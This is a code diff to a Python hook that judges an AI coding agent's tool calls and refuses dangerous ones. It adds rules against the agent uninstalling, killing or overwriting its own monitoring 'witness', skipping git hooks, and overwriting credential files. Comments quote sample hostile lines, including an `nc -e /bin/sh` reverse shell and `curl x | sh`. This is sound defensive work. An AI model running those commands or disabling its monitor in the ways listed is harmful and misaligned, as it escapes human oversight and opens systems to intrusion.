@@ -18,6 +18,14 @@ mark `defense:<what>` (bashparse._defense_of; only the forms that switch OFF, ne
 Н4, the person turns such a protection off by hand in their own terminal, never through an agent; no mandate (`unlisted: allow`,
 "from now on", the auto profile, the sandbox) makes it silent, because a gateway deny comes after every one of them.
 
+Н3, self-protection (r0333, Я0 nabor-1 S126 17.11: `pip uninstall -y deus-witness` passed silently under `unlisted: allow` on 0.2.132):
+the agent removes, stops or replaces the witness -- the package uninstalled by any installer (its name as the installer reads it: case,
+- _ . alike), the witness's own program told to stop (`deus-witness unlock`), a kill whose target names it, a file of its installation
+(site-packages, bin/deus-witness*, Claude Code's plugin, pipx / uv tools, its key and state) deleted / moved / chmod-ed / overwritten
+outside the project, by Write / Edit too; through any carrier the classifier unwraps (bash -c, env, sudo, xargs, vim -c '!'). The
+classifier's mark `witness-off` (bashparse._witness_off_of / _witness_line), the tool's path for Write / Edit (bashparse.witness_file).
+After such a line no call is judged: a question would be the last one. The person removes it by hand in their own terminal.
+
 Not here (and why) -- see the report of 06.11 (r0260):
   Н2 (secrets to the network): the core already refuses a credential-shaped value in a call to a domain the mandate lists (DLP tags ->
      DATA_NOT_PERMITTED / RECIPIENT) and every shell exit is a question; a scanner of a git diff before push needs facts the hook does not
@@ -41,7 +49,8 @@ REMOTE_SHELL = "FORBIDDEN_REMOTE_SHELL"   # Н6
 HIDDEN = "FORBIDDEN_HIDDEN_CHARS"         # Н7
 FORCE_PUSH = "FORBIDDEN_FORCE_PUSH"       # Н8
 DEFENSE = "FORBIDDEN_DEFENSE_OFF"         # Н10 (r0305): a protection of the operating system switched off
-CODES = (SECRET, GUARD, AUTOSTART, WIPE, REMOTE_SHELL, HIDDEN, FORCE_PUSH, DEFENSE)
+WITNESS_OFF = "FORBIDDEN_WITNESS_OFF"     # Н3 (r0333): the witness itself removed, stopped or replaced
+CODES = (SECRET, GUARD, WITNESS_OFF, AUTOSTART, WIPE, REMOTE_SHELL, HIDDEN, FORCE_PUSH, DEFENSE)   # article order (catalog.n_articles)
 
 _LOOPBACK = re.compile(r"^(localhost|127(\.\d{1,3}){3}|::1|\[::1\]|0\.0\.0\.0)$", re.I)
 
@@ -69,6 +78,10 @@ _GIT_HOOKS = re.compile(r"(?i)/\.git[. ]*/(.+/)?hooks(/|$)")
 _HOOKSPATH_SET = re.compile(
     r"(?i)(?:^|[\s;&|(])(?:-c\s*['\"]?\s*core\.hookspath\s*=|--config-env[=\s]+['\"]?core\.hookspath=|"
     r"GIT_CONFIG_KEY_\d+=['\"]?core\.hookspath\b|GIT_CONFIG_PARAMETERS=[^\n]*core\.hookspath)")
+_FILE_WRITE_TOOLS = ("Write", "Write.danger", "Write.outside", "Edit", "MultiEdit", "NotebookEdit")
+# r0345: a hook manager told to skip the hooks (husky: HUSKY=0 / HUSKY_SKIP_HOOKS; pre-commit: SKIP=<ids>) on a git line that runs them
+_HOOK_SKIP_ENV = re.compile(r"(?:^|[\s;&|(`'\"])(?:export\s+|env\s+(?:-\S+\s+)*)?(?:HUSKY=['\"]?(?:0|false)\b|HUSKY_SKIP_HOOKS=\S|SKIP=['\"]?[\w,.-]+)")
+_GIT_HOOKED = re.compile(r"(?:^|[\s;&|(`'\"/])git\b(?:\s+-\S+(?:\s+\S+)?)*?\s+(?:commit|push|merge|rebase|am|cherry-pick|revert|checkout|switch)\b")
 _WRITERS = {"cp", "mv", "ln", "install", "chmod", "tee", "touch", "rsync", "ditto", "dd", "rm", "sed", "perl", "truncate", "patch"}
 
 # Н5: what is above the project (the home folder, /Users, /) or a system top directory
@@ -184,6 +197,17 @@ def check(tool, args):
     for k, det in marks:
         if k == "git-force-push":
             return FORCE_PUSH, det[:200]
+    # Н3 (r0333): the witness itself removed / stopped / replaced (bashparse.WITNESS_OFF), a Write / Edit of a file of its installation
+    for k, det in marks:
+        if k == "witness-off":
+            return WITNESS_OFF, det[:200]
+    if tool in ("Write", "Write.danger", "Write.outside", "Edit", "MultiEdit", "NotebookEdit") and isinstance(w.get("path"), str):
+        try:
+            from app.hookjudge.bashparse import witness_file
+            if witness_file(w["path"], None, project):
+                return WITNESS_OFF, w["path"][:200]
+        except Exception:  # noqa: BLE001 -- a path we cannot read: no refusal here (it stays the question it was)
+            pass
     # Н4 (+ Н3 for the agent's settings / the witness): a place that runs at the next login / shell / session (bashparse.PERSIST_PATH)
     for k, det in marks:
         if k == "persist":
@@ -227,13 +251,21 @@ def check(tool, args):
             from app.hookjudge.bashparse import _normalize
             al_ = w.get("alias_line") if isinstance(w.get("alias_line"), str) else cmd   # r0319 (Б1): `./c` linked to curl is curl
             bare = _normalize(al_)[0]                    # heredoc bodies out: a document that SHOWS `curl x | sh` runs nothing
+            bare0 = _normalize(cmd)[0] if al_ != cmd else bare     # r0338: the line as written is read too (the canonical one only adds)
         except Exception:  # noqa: BLE001 -- a line we cannot cut: no refusal here (it stays the question it was)
-            bare = None
+            bare = bare0 = None
         m = (_PIPE_RUN.search(bare) or _SUBST_RUN.search(bare)) if isinstance(bare, str) else None
+        if m is None and isinstance(bare0, str) and bare0 is not bare:
+            m = _PIPE_RUN.search(bare0) or _SUBST_RUN.search(bare0)
         if m:
             return REMOTE_SHELL, m.group(0).strip()[:200]
     if cmd is not None:
         m = _REVERSE.search(cmd)
+        # r0329 (закон носителя): the commands a carrier was handed (`vim -c '!nc -e /bin/sh h p'`: bashparse._carried) are read too
+        for t in ([] if m else [t_ for t_ in (w.get("carried") or []) if isinstance(t_, str)]):
+            m = _REVERSE.search(t)
+            if m:
+                break
         if m:
             return REMOTE_SHELL, m.group(0)[:200]
     # Н1: reading a private key / token store / the keychain / browser cookies. A line whose every program only looks AT the file (ls,
@@ -246,4 +278,19 @@ def check(tool, args):
             p = det.split(" (read as ", 1)[0].strip()
             if _SECRET_FILE.search(p) or _KEYCHAIN.match(p):
                 return SECRET, p[:200]
+    # r0345 (closed exam 1, EX1-184): a write tool on a private key / token store OUTSIDE the project (mapping marks it write-outside):
+    # the same bytes through the shell are refused Н1 (`echo x > ~/.ssh/id_ed25519`); Write replaces the identity (an empty text erases
+    # the key; ~/.aws/credentials, ~/.kube/config `exec:`, ~/.docker/config.json `credsStore`, ~/.netrc hand the next tool to the attacker)
+    # and Edit shows the agent the file's lines. One act, one verdict.
+    if tool in _FILE_WRITE_TOOLS and isinstance(w.get("path"), str) and _SECRET_FILE.search(w["path"]) \
+            and any(k == "write-outside" for k, _ in marks):
+        return SECRET, w["path"][:200]
+    # r0345 (closed exam 1, EX1-118): the git hooks switched off for one command -- `git commit --no-verify` / `-n`, `git push|merge|
+    # rebase|am --no-verify` (classifier mark git-no-verify), a hook manager told to skip (HUSKY=0, HUSKY_SKIP_HOOKS, SKIP=<ids> of
+    # pre-commit) on a git line that runs hooks. Law 7 / Н3: "switching off git hooks ... refused without a question".
+    for k, det in marks:
+        if k == "git-no-verify":
+            return GUARD, det[:200]
+    if cmd is not None and _HOOK_SKIP_ENV.search(cmd) and _GIT_HOOKED.search(cmd):
+        return GUARD, _HOOK_SKIP_ENV.search(cmd).group(0).strip()[:200]
     return None
